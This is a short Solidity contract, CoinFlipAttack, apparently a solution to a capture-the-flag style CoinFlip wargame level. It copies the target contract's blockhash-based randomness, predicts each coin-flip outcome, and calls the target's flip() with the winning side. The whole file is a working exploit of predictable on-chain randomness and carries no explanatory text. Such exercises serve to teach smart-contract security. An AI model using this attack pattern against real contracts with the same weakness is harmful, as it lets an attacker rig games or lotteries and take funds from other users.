// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./CoinFlip.sol";
contract CoinFlipAttack {
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public addresss;
  uint256  public coinFlipp ;

  constructor (address add) public {
        addresss = CoinFlip(add);
    } 


  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    coinFlipp = blockValue/FACTOR;
    bool side = coinFlipp == 1 ? true : false;
    addresss.flip(side);

}}